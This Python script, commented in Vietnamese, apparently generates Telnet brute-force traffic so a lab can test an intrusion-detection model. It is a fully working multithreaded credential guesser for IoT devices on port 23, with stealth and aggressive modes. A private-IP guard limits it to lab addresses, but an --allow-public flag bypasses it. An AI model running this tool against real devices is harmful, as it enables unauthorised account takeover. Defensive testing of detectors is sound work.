#!/usr/bin/env python
"""Sinh traffic brute-force Telnet để kiểm thử lớp 'bruteforce' của model IDS trong lab.

Nhắm thiết bị IoT mở cổng 23 (vd camera). Mục tiêu là tạo *mẫu lưu lượng* brute-force (nhiều lần thử
đăng nhập liên tiếp tới cùng host:23), cho model phát hiện. Wordlist mặc định là mật khẩu giả.

Python 3.13+ bỏ telnetlib nên dùng socket thô, xử lý tối thiểu thương lượng IAC.

An toàn: chỉ cho đích IP riêng (lab); --max giới hạn số lần; dừng ngay nếu đăng nhập đúng.

Cách dùng:
  python telnet_bruteforce.py 192.168.1.27
  python telnet_bruteforce.py 192.168.1.27 --intensity aggressive --max 2000
"""
import argparse
import ipaddress
import logging
import queue
import socket
import sys
import threading
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
INTENSITY = {"stealth": (1, 1), "low": (2, 5), "medium": (4, 20), "aggressive": (16, 0)}
IAC, DONT, DO, WONT, WILL = 255, 254, 253, 252, 251
FAIL_MARKERS = (b"incorrect", b"invalid", b"fail", b"denied", b"wrong", b"login:", b"bad")


def is_lab(ip, allow_public):
    try:
        return allow_public or ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def load_list(path, fallback):
    if path and Path(path).exists():
        return [l.rstrip("\n") for l in Path(path).read_text(encoding="utf-8", errors="replace").splitlines() if l]
    return fallback


def negotiate(sock, data):
    """Trả lời tối thiểu các lệnh IAC (từ chối mọi tuỳ chọn), trả về phần text đã bỏ IAC."""
    out = bytearray()
    i = 0
    while i < len(data):
        if data[i] == IAC and i + 2 < len(data):
            command, option = data[i + 1], data[i + 2]
            if command == DO:
                sock.sendall(bytes([IAC, WONT, option]))
            elif command == WILL:
                sock.sendall(bytes([IAC, DONT, option]))
            i += 3
        else:
            out.append(data[i])
            i += 1
    return bytes(out)


def read_until(sock, markers, timeout):
    """Đọc tới khi gặp một marker (bytes, chữ thường) hoặc hết timeout. Trả về text tích luỹ."""
    sock.settimeout(timeout)
    buffer = bytearray()
    end = time.time() + timeout
    while time.time() < end:
        try:
            chunk = sock.recv(1024)
        except (socket.timeout, OSError):
            break
        if not chunk:
            break
        buffer += negotiate(sock, chunk)
        low = bytes(buffer).lower()
        if any(m in low for m in markers):
            break
    return bytes(buffer).lower()


def try_login(target, port, user, password, timeout, src):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.bind((src, 0))
    except OSError:
        pass
    try:
        sock.settimeout(timeout)
        sock.connect((target, port))
        read_until(sock, (b"login:", b"username:", b"user:"), timeout)
        sock.sendall(user.encode() + b"\r\n")
        read_until(sock, (b"password:", b"pass:"), timeout)
        sock.sendall(password.encode() + b"\r\n")
        reply = read_until(sock, FAIL_MARKERS, timeout)
        if reply and not any(m in reply for m in FAIL_MARKERS):
            return "ok"
        return "bad"
    except (socket.timeout, OSError):
        return "refused"
    finally:
        sock.close()


class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.tried = self.refused = 0
        self.found = None
        self.start = time.time()

    def record(self, result, user, password):
        with self.lock:
            self.tried += 1
            if result == "refused":
                self.refused += 1
            if result == "ok" and not self.found:
                self.found = (user, password)
            return self.tried


class RateLimiter:
    def __init__(self, per_second):
        self.interval = 1.0 / per_second
        self.lock = threading.Lock()
        self.next = time.time()

    def wait(self):
        with self.lock:
            now = time.time()
            if now < self.next:
                time.sleep(self.next - now)
            self.next = max(now, self.next) + self.interval


def worker(jobs, stats, cfg, limiter, stop):
    while not stop.is_set():
        try:
            user, password = jobs.get_nowait()
        except queue.Empty:
            return
        if limiter:
            limiter.wait()
        result = try_login(cfg["target"], cfg["port"], user, password, cfg["timeout"], cfg["src"])
        count = stats.record(result, user, password)
        if result == "ok":
            stop.set()
            logging.info("DANG NHAP DUNG: %s / %s (dung lai)", user, password)
            return
        if count % 50 == 0:
            logging.info("da thu %d (tu choi %d) %.1f lan/giay", count, stats.refused,
                         count / max(time.time() - stats.start, 1e-6))


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("target")
    parser.add_argument("--port", type=int, default=23)
    parser.add_argument("--intensity", choices=list(INTENSITY), default="medium")
    parser.add_argument("-U", "--users")
    parser.add_argument("-P", "--passwords")
    parser.add_argument("--max", type=int, default=1000)
    parser.add_argument("--rate", type=float, default=None)
    parser.add_argument("--threads", type=int, default=None)
    parser.add_argument("--timeout", type=float, default=6.0)
    parser.add_argument("--src", default="192.168.1.186")
    parser.add_argument("--allow-public", action="store_true")
    args = parser.parse_args()
    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")
    sys.stdout.reconfigure(encoding="utf-8")

    if not is_lab(args.target, args.allow_public):
        logging.error("Tu choi: %s khong phai IP lab (dai rieng).", args.target)
        return 2

    users = load_list(args.users, load_list(HERE / "wordlists" / "users.txt", ["admin", "root", "user"]))
    passwords = load_list(args.passwords, load_list(HERE / "wordlists" / "passwords.txt", [f"pass{i}" for i in range(1, 401)]))
    threads, default_rate = INTENSITY[args.intensity]
    threads = args.threads or threads
    rate = args.rate if args.rate is not None else default_rate
    limiter = RateLimiter(rate) if rate and rate > 0 else None

    jobs = queue.Queue()
    added = 0
    for password in passwords:
        for user in users:
            if added >= args.max:
                break
            jobs.put((user, password))
            added += 1
        if added >= args.max:
            break

    logging.info("Brute-force Telnet -> %s:%d | %d lan thu, %d luong%s", args.target, args.port, added, threads,
                 f", {rate} lan/giay" if limiter else ", khong gioi han")
    cfg = {"target": args.target, "port": args.port, "timeout": args.timeout, "src": args.src}
    stats = Stats()
    stop = threading.Event()
    pool = [threading.Thread(target=worker, args=(jobs, stats, cfg, limiter, stop)) for _ in range(threads)]
    for thread in pool:
        thread.start()
    try:
        for thread in pool:
            thread.join()
    except KeyboardInterrupt:
        stop.set()
        logging.info("Dung theo yeu cau.")

    elapsed = time.time() - stats.start
    logging.info("Xong: %d lan thu trong %.1fs (%.1f lan/giay), %d bi tu choi.", stats.tried, elapsed,
                 stats.tried / max(elapsed, 1e-6), stats.refused)
    if stats.found:
        logging.info("Dang nhap dung: %s / %s", *stats.found)
    if stats.refused > stats.tried * 0.5:
        logging.warning("Nhieu ket noi bi tu choi: camera co the gioi han ket noi, hoac cong 23 khong mo.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
